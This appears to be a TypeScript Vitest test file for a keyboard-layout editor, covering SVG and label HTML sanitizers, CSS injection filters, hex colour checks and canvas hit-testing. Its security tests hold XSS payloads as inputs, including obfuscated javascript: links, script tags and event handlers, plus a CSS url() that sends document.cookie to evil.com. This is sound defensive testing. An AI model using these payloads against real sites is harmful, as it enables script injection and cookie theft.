/**
 * L12 修复：安全消毒 + 交互逻辑集成测试
 *
 * 覆盖阿里ocr-v2.md 审计报告中缺失的测试面：
 *  - C1: sanitizeSvg 绕过防护（实体编码/换行注入/data: 协议）
 *  - C2: CSS 注入过滤（url/expression/javascript 模式）
 *  - H6: L 形按键 hitTest + 框选（x2/y2/w2/h2 延伸区域）
 *  - H5: pan/zoom 后逆变换坐标（panX/panY 参与计算）
 */

import { describe, it, expect } from "vitest";
import { sanitizeSvg, sanitizeLabelHtml, isValidHexColor } from "@/lib/sanitize";
import { hitTestKey, getKeysInArea } from "@/components/canvas/CanvasInteraction";
import type { KeyProps } from "@/lib/kle-types";
import { DEFAULT_PROPS } from "@/lib/kle-types";
import { KEY_UNIT } from "@/lib";

// ═══════════════════════════════════════════════════════════════
// C1: SVG Sanitizer — 绕过攻击向量防御
// ═══════════════════════════════════════════════════════════════

describe("sanitizeSvg — bypass defenses", () => {
  it("strips javascript: protocol from href", () => {
    const result = sanitizeSvg(`<a href="javascript:alert(1)">link</a>`);
    expect(result).not.toContain("javascript:");
    expect(result).toContain('href="#"');
  });

  it("strips javascript: with newline injection", () => {
    const result = sanitizeSvg(`<a href="java\nscript:alert(1)">link</a>`);
    expect(result).not.toContain("javascript:");
    // 换行被 strip 后 normalized 字符串仍被 isDangerousHref 检测
    expect(result).toContain('href="#"');
  });

  it("strips HTML entity-encoded javascript: (&#106;)", () => {
    const result = sanitizeSvg(`<a href="&#106;avascript:alert(1)">link</a>`);
    // decodeEntities + isDangerousHref 应在二次解码后拦截
    expect(result).toContain('href="#"');
  });

  it("strips data:text/html URIs", () => {
    const result = sanitizeSvg(`<a href="data:text/html,<script>alert(1)</script>">link</a>`);
    expect(result).not.toContain("data:text/html");
    expect(result).toContain('href="#"');
  });

  it("removes <script> blocks entirely", () => {
    const result = sanitizeSvg(`<svg><script>alert(1)</script><rect/></svg>`);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
  });

  it("removes <foreignObject> blocks entirely", () => {
    const result = sanitizeSvg(`<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`);
    expect(result).not.toContain("foreignObject");
  });

  it("strips on* event handlers (onclick, onload, onerror)", () => {
    const result = sanitizeSvg(`<rect onclick="evil()" onload="evil()" onerror="evil()"/>`);
    expect(result).not.toMatch(/\bonclick\b/);
    expect(result).not.toMatch(/\bonload\b/);
    expect(result).not.toMatch(/\bonerror\b/);
  });

  it("handles mixed case event handlers", () => {
    const result = sanitizeSvg(`<div onClick="evil()" ONLOAD="evil()"/>`);
    expect(result).not.toMatch(/\bonClick\b/i);
    expect(result).not.toMatch(/\bONLOAD\b/i);
  });

  it("passes clean SVG through unchanged (except whitespace)", () => {
    const clean = `<svg viewBox="0 0 100 100"><rect x="0" y="0" width="100" height="100" fill="blue"/></svg>`;
    const result = sanitizeSvg(clean);
    expect(result).toContain("<rect");
    expect(result).toContain('fill="blue"');
  });

  it("handles empty/null input gracefully", () => {
    expect(sanitizeSvg("")).toBe("");
    expect(sanitizeSvg(null as unknown as string)).toBe(null);
    expect(sanitizeSvg(undefined as unknown as string)).toBe(undefined);
  });
});

// ═══════════════════════════════════════════════════════════════
// C2: CSS injection filtering in KeyboardCanvas (pattern-level)
// ═══════════════════════════════════════════════════════════════

describe("CSS injection — filter patterns", () => {
  // These test the regex patterns used in KeyboardCanvas.tsx safeCss useMemo
  const filterCSS = (css: string): string => {
    return css
      .replace(/url\s*\(/gi, "url(/* filtered */")
      .replace(/expression\s*\(/gi, "expression(/* filtered */")
      .replace(/-moz-binding\s*:/gi, "-moz-binding: none")
      .replace(/javascript\s*:/gi, "/* javascript: filtered */");
  };

  it("filters url() data exfiltration", () => {
    const malicious = "body { background: url('https://evil.com/steal?data=' + document.cookie); }";
    const result = filterCSS(malicious);
    expect(result).not.toMatch(/url\s*\(\s*['"]/);
    expect(result).toContain("/* filtered */");
  });

  it("filters expression() injection", () => {
    const malicious = "body { width: expression(alert(1)); }";
    const result = filterCSS(malicious);
    expect(result).toContain("/* filtered */");
    expect(result).not.toMatch(/expression\s*\(\s*alert/);
  });

  it("filters -moz-binding", () => {
    const malicious = "body { -moz-binding: url('http://evil.com/xml#xss'); }";
    const result = filterCSS(malicious);
    expect(result).toContain("-moz-binding: none");
  });

  it("filters javascript: in CSS", () => {
    const malicious = "body { background-image: javascript:alert(1); }";
    const result = filterCSS(malicious);
    expect(result).toContain("/* javascript: filtered */");
  });

  it("leaves valid CSS unchanged", () => {
    const valid = "body { background-color: #eee; color: #333; font-size: 14px; }";
    const result = filterCSS(valid);
    expect(result).toBe(valid);
  });
});

// ═══════════════════════════════════════════════════════════════
// H8: isValidHexColor — 精确 hex 长度验证
// ═══════════════════════════════════════════════════════════════

describe("isValidHexColor — strict CSS hex validation", () => {
  it("accepts valid #rgb (3-digit)", () => {
    expect(isValidHexColor("#abc")).toBe(true);
    expect(isValidHexColor("#f00")).toBe(true);
  });

  it("accepts valid #rgba (4-digit)", () => {
    expect(isValidHexColor("#abcd")).toBe(true);
    expect(isValidHexColor("#f008")).toBe(true);
  });

  it("accepts valid #rrggbb (6-digit)", () => {
    expect(isValidHexColor("#aabbcc")).toBe(true);
    expect(isValidHexColor("#ff0000")).toBe(true);
  });

  it("accepts valid #rrggbbaa (8-digit)", () => {
    expect(isValidHexColor("#aabbccdd")).toBe(true);
    expect(isValidHexColor("#ff000080")).toBe(true);
  });

  it("rejects invalid 5-digit hex", () => {
    expect(isValidHexColor("#12345")).toBe(false);
  });

  it("rejects invalid 7-digit hex", () => {
    expect(isValidHexColor("#1234567")).toBe(false);
  });

  it("rejects non-hex values", () => {
    expect(isValidHexColor("red")).toBe(false);
    expect(isValidHexColor("rgb(255,0,0)")).toBe(false);
    expect(isValidHexColor("")).toBe(false);
  });

  it("rejects non-string input", () => {
    expect(isValidHexColor(null as unknown as string)).toBe(false);
    expect(isValidHexColor(undefined as unknown as string)).toBe(false);
    expect(isValidHexColor(123 as unknown as string)).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════
// H6: L 形按键 hitTest + 框选（x2/y2/w2/h2 延伸区域）
// ═══════════════════════════════════════════════════════════════

describe("hitTestKey — L-shaped key extension regions", () => {
  // Standard ISO Enter: 1.25u wide main key + x2=-0.25/w2=1.5 extension
  const isoEnter: KeyProps = {
    ...DEFAULT_PROPS,
    labels: Array(12).fill(""),
    align: 4, labelSize: 3,
    x: 13.5, y: 2, w: 1.25, h: 1,
    x2: -0.25, y2: 1, w2: 1.5, h2: 1,
  };

  // Big-Ass Enter: 1.5u wide + x2=-0.75/w2=2.25 extension
  const bigAssEnter: KeyProps = {
    ...DEFAULT_PROPS,
    labels: Array(12).fill(""),
    align: 4, labelSize: 3,
    x: 13.5, y: 2, w: 1.5, h: 1,
    x2: -0.75, y2: 1, w2: 2.25, h2: 1,
  };

  it("hits the main body of ISO Enter", () => {
    const px = (13.5 + 0.625) * KEY_UNIT; // center of main rectangle
    const py = (2 + 0.5) * KEY_UNIT;
    const idx = hitTestKey(px, py, [isoEnter]);
    expect(idx).toBe(0);
  });

  it("hits the extension region of ISO Enter (x2/w2 area)", () => {
    const px = (13.25 + 0.75) * KEY_UNIT; // center of extension
    const py = (3 + 0.5) * KEY_UNIT;
    const idx = hitTestKey(px, py, [isoEnter]);
    expect(idx).toBe(0);
  });

  it("ISO Enter extension area hits key when other keys exist below but not covering", () => {
    const farKey: KeyProps = {
      ...DEFAULT_PROPS,
      labels: Array(12).fill(""), align: 4, labelSize: 3,
      x: 0, y: 0, w: 1, h: 1,
    };
    const px = (13.25 + 0.75) * KEY_UNIT;
    const py = (3 + 0.5) * KEY_UNIT;
    const idx = hitTestKey(px, py, [farKey, isoEnter]);
    expect(idx).toBe(1); // isoEnter is topmost (reverse z-order, index 1)
  });

  it("hits Big-Ass Enter extension region", () => {
    const px = (12.75 + 1.125) * KEY_UNIT;
    const py = (3 + 0.5) * KEY_UNIT;
    const idx = hitTestKey(px, py, [bigAssEnter]);
    expect(idx).toBe(0);
  });

  it("returns null for point outside all keys", () => {
    const px = 100 * KEY_UNIT;
    const py = 100 * KEY_UNIT;
    const idx = hitTestKey(px, py, [isoEnter, bigAssEnter]);
    expect(idx).toBeNull();
  });
});

describe("getKeysInArea — L-shaped key extension in marquee selection", () => {
  const isoEnter: KeyProps = {
    ...DEFAULT_PROPS,
    labels: Array(12).fill(""),
    align: 4, labelSize: 3,
    x: 13.5, y: 2, w: 1.25, h: 1,
    x2: -0.25, y2: 1, w2: 1.5, h2: 1,
  };

  const keys = [isoEnter];

  it("selects key via marquee covering extension region only", () => {
    // Extension: x=13.25 to 14.75, y=3 to 4 (in key units)
    const ids = getKeysInArea(
      13.0 * KEY_UNIT, 3.2 * KEY_UNIT,  // start
      15.0 * KEY_UNIT, 4.5 * KEY_UNIT,   // end
      keys,
    );
    expect(ids).toContain("0");
  });

  it("selects key via marquee covering main body only", () => {
    const ids = getKeysInArea(
      13.0 * KEY_UNIT, 1.5 * KEY_UNIT,
      15.0 * KEY_UNIT, 3.5 * KEY_UNIT,
      keys,
    );
    expect(ids).toContain("0");
  });

  it("does not select key when marquee is far away", () => {
    const ids = getKeysInArea(
      0, 0,
      5 * KEY_UNIT, 5 * KEY_UNIT,
      keys,
    );
    expect(ids).toHaveLength(0);
  });
});

// ═══════════════════════════════════════════════════════════════
// H5: Pan/zoom coordinate transform 验证
// ═══════════════════════════════════════════════════════════════

describe("getCanvasPos — pan/zoom inverse transform logic", () => {
  // getCanvasPos 的公式在 KeyboardCanvas.tsx:140：
  //   x = (clientX - rect.left - panX) / scale
  //   y = (clientY - rect.top  - panY) / scale
  // 这里测试公式本身的数学正确性（不依赖 DOM）

  function computeCanvasPos(
    clientX: number, clientY: number,
    rectLeft: number, rectTop: number,
    panX: number, panY: number,
    scale: number,
  ): { x: number; y: number } {
    return {
      x: (clientX - rectLeft - panX) / scale,
      y: (clientY - rectTop - panY) / scale,
    };
  }

  it("returns identity transform at scale=1, no pan", () => {
    const pos = computeCanvasPos(100, 200, 0, 0, 0, 0, 1);
    expect(pos.x).toBeCloseTo(100);
    expect(pos.y).toBeCloseTo(200);
  });

  it("handles zoom-in (scale=2) correctly", () => {
    const pos = computeCanvasPos(200, 300, 0, 0, 0, 0, 2);
    expect(pos.x).toBeCloseTo(100);
    expect(pos.y).toBeCloseTo(150);
  });

  it("handles pan offset correctly", () => {
    // canvas panned right by 50px, point at client 200 should map to canvas 150
    const pos = computeCanvasPos(200, 100, 0, 0, 50, 0, 1);
    expect(pos.x).toBeCloseTo(150);
  });

  it("handles combined pan + zoom", () => {
    // 2x zoom, panned right 100px down 50px
    const pos = computeCanvasPos(500, 350, 0, 0, 100, 50, 2);
    expect(pos.x).toBeCloseTo(200); // (500 - 0 - 100) / 2 = 200
    expect(pos.y).toBeCloseTo(150); // (350 - 0 - 50) / 2 = 150
  });

  it("handles negative pan correctly", () => {
    const pos = computeCanvasPos(100, 100, 0, 0, -50, -30, 1);
    expect(pos.x).toBeCloseTo(150); // (100 - 0 - (-50)) = 150
    expect(pos.y).toBeCloseTo(130);
  });

  it("clamps min zoom to 0.25 correctly in pos calculation", () => {
    // min zoom is 0.25 in KeyboardCanvas, test formula with that
    const pos = computeCanvasPos(100, 200, 0, 0, 0, 0, 0.25);
    expect(pos.x).toBeCloseTo(400);
    expect(pos.y).toBeCloseTo(800);
  });
});

// ═══════════════════════════════════════════════════════════════
// sanitizeLabelHtml — KLE 标签白名单消毒
// ═══════════════════════════════════════════════════════════════

describe("sanitizeLabelHtml — KLE label HTML whitelist", () => {
  it("preserves allowed tags: <b>, <i>, <u>, <sub>, <sup>, <br>, <font>", () => {
    const html = '<b>bold</b> <i>italic</i> <u>underline</u> H<sub>2</sub>O x<sup>2</sup><br><font color="#ff0000">red</font>';
    const result = sanitizeLabelHtml(html);
    expect(result).toContain("<b>");
    expect(result).toContain("<i>");
    expect(result).toContain("<u>");
    expect(result).toContain("<sub>");
    expect(result).toContain("<sup>");
    expect(result).toContain("<br>");
    expect(result).toContain('<font color="#ff0000">');
  });

  it("strips disallowed tags like <script>, <div>, <span>", () => {
    const html = '<div>text</div><script>alert(1)</script><span>bad</span>';
    const result = sanitizeLabelHtml(html);
    expect(result).not.toContain("<div>");
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("<span>");
  });

  it("strips event handlers from allowed tags", () => {
    const html = '<b onclick="alert(1)">click</b>';
    const result = sanitizeLabelHtml(html);
    expect(result).not.toMatch(/\bonclick\b/);
    expect(result).toContain("<b>");
    expect(result).toContain("click");
  });

  it("strips dangerous href from font tag", () => {
    const html = '<font color="#ff0000">safe</font><a href="javascript:alert(1)">bad</a>';
    const result = sanitizeLabelHtml(html);
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("<a");
  });

  it("handles empty/null input", () => {
    expect(sanitizeLabelHtml("")).toBe("");
    expect(sanitizeLabelHtml(null as unknown as string)).toBe(null);
  });
});
